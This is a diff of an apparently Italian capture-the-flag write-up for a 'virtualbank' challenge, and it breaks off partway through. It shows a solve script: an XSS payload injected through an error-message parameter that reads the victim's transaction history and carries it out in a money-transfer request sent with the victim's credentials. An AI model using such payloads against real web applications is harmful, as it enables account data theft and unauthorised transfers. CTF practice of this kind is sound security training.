@@ -4,7 +4,7 @@ che poi manderemo nella causale della transazione. In riusciamo a aggirare le cs
 
 solve script:
 
-<script src="/error/?msg=fetch('http://virtualbank.challs.olicyber.it/history/1').then((res) => res.text()).then((res) => await fetch('http://virtualbank.challs.olicyber.it/sendmoney', {
+<script src="/error/?msg=fetch('http://virtualbank.challs.olicyber.it/history/1').then((res) => res.text()).then((res) => fetch('http://virtualbank.challs.olicyber.it/sendmoney', {
     'credentials': 'include',
     'headers': {
         'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
